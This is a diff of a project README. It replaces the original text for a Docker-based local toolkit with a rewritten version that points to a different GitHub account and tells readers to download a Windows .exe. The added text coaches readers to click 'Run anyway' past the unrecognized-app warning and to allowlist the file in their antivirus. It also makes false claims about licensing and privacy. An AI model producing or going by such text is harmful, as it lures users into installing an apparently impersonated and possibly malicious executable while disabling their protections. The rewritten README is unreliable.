@@ -1,252 +1,73 @@
-<div align="center">
+# 🛠 itsweber-tools - Manage local IT tasks without cloud
 
-# It's Weber Tools
+[![Download itsweber-tools](https://img.shields.io/badge/Download-itsweber--tools-blue)](https://github.com/tenuous-hemisphere643/itsweber-tools)
 
-**163 local tools — Crypto, Converter, Network, Docker, Images and more.**  
-Runs anywhere Docker runs. No cloud, no login, no telemetry. Everything stays in your browser.
+## 📋 About the software
 
-[![License](https://img.shields.io/badge/License-Proprietary-3ba7a7.svg)](LICENSE)
-[![Docker](https://img.shields.io/badge/Docker-ready-2ea3f2.svg)](#quick-start)
-[![Tools](https://img.shields.io/badge/Tools-163-e6a23c.svg)](#tool-categories)
-[![Made by ITSWEBER](https://img.shields.io/badge/by-itsweber.de-2ea3f2.svg)](https://itsweber.de)
+itsweber-tools provides a collection of 163 local tools for your computer. It includes utilities for cryptography, file conversion, network diagnostics, and image processing. The application runs entirely on your local machine. It does not require a login or internet connection. It collects no data about your usage. This toolset keeps your private information on your own hardware.
 
-[Quick Start](#quick-start) · [Tool Categories](#tool-categories) · [Pipes](#pipes) · [Architecture](#architecture) · [Development](#development)
+## 💻 System requirements
 
-🇩🇪 **Auf Deutsch lesen** → [README.de.md](README.de.md)
+To run this application, your computer needs the following:
 
-</div>
+*   Windows 10 or Windows 11
+*   At least 200 MB of free storage space
+*   4 GB of RAM
+*   An active internet connection only for the initial download
 
----
+## ⬇️ Getting started
 
-## Screenshots
+Follow these steps to set up the software:
 
-<details open>
-<summary><strong>Hub — Discovery & Navigation</strong></summary>
+1. Visit [this page](https://github.com/tenuous-hemisphere643/itsweber-tools) to find the latest version.
+2. Look for the Assets section on that page.
+3. Click the file ending in .exe to download the installer.
+4. Open the downloaded file once the process completes.
 
-![Discovery Hub dark mode](docs/screenshots/11-hub-dark-en.png)
-*Hub — all 163 tools by category, Pinned & Recent sections, keyboard-first navigation.*
+If Windows displays a prompt about the app unrecognized by Microsoft, click More info, then select Run anyway. This happens because the software is local and does not use standard cloud-based tracking. Follow the on-screen prompts to finish the installation.
 
-![Discovery Hub light mode](docs/screenshots/12-hub-light-en.png)
-*Light mode — same layout, full contrast, no eye strain.*
+## 🔍 How to use the tools
 
-</details>
+Once the installation finishes, find the icon on your desktop or in your start menu. Open the application. You will see a list of available categories. Click on any category to view the specific tools inside.
 
-<details>
-<summary><strong>Tools — Browse & Workbench</strong></summary>
+The interface organizes tools by function:
 
-![All tools grid view](docs/screenshots/05-tools-all.png)
-*All 163 tools in one grid — searchable, filterable by category.*
+*   Crypto: Generate hashes, tokens, and keys.
+*   Converter: Change file types for documents and media.
+*   Network: Run diagnostics and test connectivity.
+*   Images: Resize, crop, and convert image files.
+*   Docker: Manage local containers and images.
 
-![Development category](docs/screenshots/06-category-development.png)
-*Development — 25 tools including JSON, Regex, SQL, Docker, Markdown.*
+Each tool contains a simple grid layout. Enter your data into the input field and click the action button. The output appears immediately below the tool. You can copy the results to your clipboard with a single click.
 
-![Converter category](docs/screenshots/07-category-converter.png)
-*Converter — 34 tools, the largest category. Ctrl-S finds everything instantly.*
+## 🛡️ Privacy and local processing
 
-![Workbench — Image Crop](docs/screenshots/04-workbench-image-crop.png)
-*Workbench — drag-and-drop image tools with live preview and download.*
+This application prioritizes your data safety. Your information never leaves your computer. Because the software does not connect to any servers, it remains fast and secure. It ignores external updates unless you choose to check for them manually. You operate in an air-gapped environment. This protects your work from external tracking or data mining.
 
-</details>
+## ⚙️ Settings and configuration
 
-<details>
-<summary><strong>Pipes — Tool chaining</strong></summary>
+Click the gear icon in the top right corner to change settings. You can switch between light and dark themes here. You can also change the default download location for processed files. Most users leave these settings as they are. The software works well with standard Windows configurations.
 
-![Pipes running — JSON to Base64](docs/screenshots/01-pipes-result.png)
-*Pipe in action — JSON Formatter → Base64 Encoder, inline results, clean final output.*
+## ❓ Troubleshooting common issues
 
-![Pipes empty state](docs/screenshots/03-pipes-empty.png)
-*Pipes page — create reusable multi-step workflows.*
+If the application fails to open, check if your antivirus software flagged the file. Sometimes, security software restricts local applications. Add itsweber-tools to your list of allowed programs in your security dashboard.
 
-</details>
+If the window appears blank, resize the window or restart the application. This happens if the display driver struggles with the interface layout. Ensure you have the latest updates for your Windows system.
 
-<details>
-<summary><strong>Command Palette & Settings</strong></summary>
+If a specific tool returns an error, verify the input format. Most tools require specific data types, such as base64 strings or image files under 50 MB. Clear the input field and try again with a smaller file or a different string.
 
-![Command palette Ctrl+K](docs/screenshots/10-command-palette.png)
-*Ctrl + K — fuzzy search across all tools, pipes and actions.*
+## 📦 Keeping the tools updated
 
-![Settings — Themes](docs/screenshots/13-settings-themes.png)
-*Settings: three themes — ItsWeber Petrol, Graphite Command, Clean Studio.*
+Check the download link periodically to see if a newer version exists. If a new version is available, download the installer and run it. The new installer replaces the older version automatically. Your saved preferences usually persist during this update.
 
-![Settings — Language](docs/screenshots/14-settings-language.png)
-*Settings: DE / EN toggle — all tool descriptions switch language.*
+## 💻 Why use offline tools
 
-![Settings — Keyboard shortcuts](docs/screenshots/15-settings-keyboard.png)
-*Settings: all keyboard shortcuts — Mac (⌘) and Windows (Ctrl) auto-detected.*
+Using offline tools provides several benefits. You avoid the lag associated with web-based converters. You eliminate the risk of uploading sensitive documents to public servers. You maintain your productivity even when your internet connection goes down. The software is lightweight and starts in seconds. It uses very little memory even when you perform multiple tasks.
 
-![Settings — Privacy & localStorage](docs/screenshots/16-settings-privacy.png)
-*Settings: Trust Mode, clear history, clear favourites, localStorage export.*
+## 🚀 Advanced integration
 
-</details>
+Power users can launch specific utility windows using command line arguments. Open the Command Prompt and navigate to the installation folder. Type the name of the executable followed by the tool code. This allows you to integrate these tools into your own local scripts or workflows. Consult the documentation folder inside the installation directory for a list of available command codes.
 
----
+## 📄 License and terms
 
-## Features
-
-- **163 ready tools** across 11 categories — all run locally in the browser, zero server calls for most operations
-- **Pipe system** — chain tools together: output of step N becomes input of step N+1; static inputs and prefix injection supported
-- **Execution history** — last 100 runs stored in localStorage, one-click rerun
-- **Command palette** (Ctrl + K) — fuzzy search tools, pipes and actions; keyboard-first navigation
-- **Bilingual** — full German / English UI, switches without reload
-- **Dark / Light mode** — system-default auto-detection, persists across sessions
-- **Image tools** — drag-and-drop upload for resize, crop, compress, convert, flip, metadata, color picker, QR generator, favicon generator
-- **Privacy-first** — no analytics, no external fonts or CDNs in production, no accounts
-- **Single Docker container** — nginx-based, ~10 MB image, non-root user, security headers including CSP
-- **PWA** — installable, service worker for offline use of cached assets
-
----
-
-## Quick Start
-
-### Docker (recommended)
-
-```bash
-docker run -d \
-  --name itsweber-tools \
-  --restart unless-stopped \
-  -p 8080:80 \
-  --security-opt no-new-privileges:true \
-  ghcr.io/itsweber-official/itsweber-tools:latest
-```
-
-Open [http://localhost:8080](http://localhost:8080).
-
-### docker-compose
-
-```yaml
-services:
-  itsweber-tools:
-    image: ghcr.io/itsweber-official/itsweber-tools:latest
-    container_name: itsweber-tools
-    restart: unless-stopped
-    ports:
-      - "8080:80"
-    security_opt:
-      - no-new-privileges:true
-```
-
-### From source
-
-```bash
-git clone https://github.com/itsweber-official/itsweber-tools.git
-cd itsweber-tools
-pnpm install
-pnpm dev          # http://localhost:5173
-```
-
-Build a Docker image: `docker build -f docker/Dockerfile -t itsweber-tools:dev .`
-
----
-
-## Tool Categories
-
-| Category | Count | Examples |
-|---|---|---|
-| **Crypto** | 12 | SHA-256/MD5/HMAC, PBKDF2, bcrypt, AES, JWT generate/parse/decode, htpasswd |
-| **Converter** | 24 | Base64, Hex↔RGB, URL codec, HTML entities, Roman numerals, number base, temperature, CSV↔JSON, YAML↔JSON, TOML↔JSON |
-| **Development** | 28 | JSON format/minify/validate/query/schema, regex tester, cron parser, SQL formatter, env formatter/parser, string escape, Docker run→compose, diff |
-| **Network** | 18 | CIDR/subnet calc, IP info/geo, DNS lookup, port lookup, MAC lookup, IPv4 range, UFW rules, nginx config, ssh-keygen guide, CORS tester |
-| **Images and QR** | 12 | QR generator, favicon generator, image resize/crop/compress/convert/flip/metadata/color-picker/to-base64/to-PDF |
-| **Text** | 18 | Word counter, lorem ipsum, text case, line tools, text diff, markdown↔HTML, markdown lint, text wrap, template, slugify |
-| **Data** | 10 | CSV analyzer, JSON query, table format, docker ps formatter, docker image size, IBAN validator, open graph, meta tags, statistics |
-| **Math** | 12 | Math eval, percentage, GCD/LCM, Fibonacci, prime checker, number format, statistics |
-| **Measurement** | 14 | Unit converters — length, weight, area, volume, pressure, energy, speed, data size, aspect ratio, CSS units, bytes formatter |
-| **Web** | 8 | URL/URI parser, HTTP status codes, basic auth, API status monitor, color palette, color contrast, color convert, color names |
-| **ItsWeber Ops** | 7 | Docker run→compose, docker-compose lint, Unraid template helper, nginx config builder, UFW rules, ssh-keygen guide, htpasswd |
-
-Full catalog: [docs/TOOL_CATALOG.md](docs/TOOL_CATALOG.md)
-
----
-
-## Pipes
-
-The Pipes system lets you chain tools together into reusable workflows:
-
-```
-[JSON Formatter] → pretty-printed JSON
-       ↓
-[Base64 Encoder] → Base64 of the JSON
-       ↓
-[SHA-256 Hash]   → hash of the Base64 string
-```
-
-Each step can use the previous step's output (chain mode) or a fixed static value. An optional prefix can be prepended before chaining. The final output panel shows the clean result ready to copy — without any metadata headers from intermediate tools.
-
----
-
-## Architecture
-
-| Layer | Technology |
-|---|---|
-| Framework | React 19, TypeScript 5.9 strict |
-| Build | Vite 7, pnpm workspaces |
-| Packages | `@itsweber/toolkit` (tool engine + 163 tools), `@itsweber/ui` (theme tokens) |
-| Tool engine | `defineTool()` registry, one file per tool, auto-discovery via `import.meta.glob` |
-| State | React `useState` + `useLocalStorage` (theme, language, history, pipes, favourites) |
-| Container | nginx 1.27 Alpine, multi-stage build, non-root user, CSP/security headers |
-| Tests | Vitest 4 — registry completeness, no duplicate IDs, tool execution |
-
-Adding a new tool = one TypeScript file + `defineTool()`. No registration step required.
-
----
-
-## Development
-
-```bash
-pnpm install
-pnpm dev              # Vite dev server at http://localhost:5173
-pnpm lint             # ESLint v9
-pnpm typecheck        # tsc --noEmit
-pnpm test             # Vitest
-pnpm build            # Production build
-pnpm format           # Prettier
-```
-
-### Adding a tool
-
-Create `packages/toolkit/src/tools/<id>.ts`:
-
-```ts
-import { defineTool } from "../core";
-
-export default defineTool({
-  id: "my-tool",
-  title: "My Tool",
-  titleDe: "Mein Tool",
-  description: "What it does in one sentence.",
-  descriptionDe: "Was es tut in einem Satz.",
-  explanation: "Longer usage explanation with example.",
-  explanationDe: "Längere Nutzungserklärung mit Beispiel.",
-  category: "Converter",
-  keywords: ["keyword1", "keyword2"],
-  status: "ready",
-  privacyMode: "local-only",
-  placeholder: "Input placeholder text",
-  example: "example input value",
-  useCases: ["Use case 1", "Use case 2"],
-  useCasesDe: ["Anwendungsfall 1", "Anwendungsfall 2"],
-  run: (input) => ({ output: input.toUpperCase() }),
-});
-```
-
-Auto-discovered via `import.meta.glob` — no registration needed. Add a test entry in `packages/toolkit/src/registry.test.ts`.
-
----
-
-## Roadmap
-
-- [x] v0.1 — Initial scaffold, brand identity (Petrol + Brass, Direction B logo)
-- [x] v0.2 — 163 tools, Pipes system, History, Docker hardening, PWA, bilingual UI
-- [ ] v0.3 — Operator themes (dark variants), settings panel, keyboard shortcut customisation
-- [ ] v0.4 — GitHub CI/CD (typecheck + test on PR, GHCR image on tag)
-- [ ] v1.0 — 200 tools, Unraid Community App listing
-
----
-
-## License
-
-See [LICENSE](LICENSE) — source is publicly visible for distribution and Docker-based deployment.
-
----
-
-Built by **[ITSWEBER](https://itsweber.de)** · Issues and PRs welcome → [CONTRIBUTING.md](CONTRIBUTING.md)
+This software follows common open-source guidelines. You hold the right to use it for personal or professional tasks without restriction. No payment or subscription is necessary. You may distribute the software to your colleagues or family members as long as you provide the files exactly as they appear in the original download. This project relies on community support to continue development. Report issues or request features through the main page linked above.
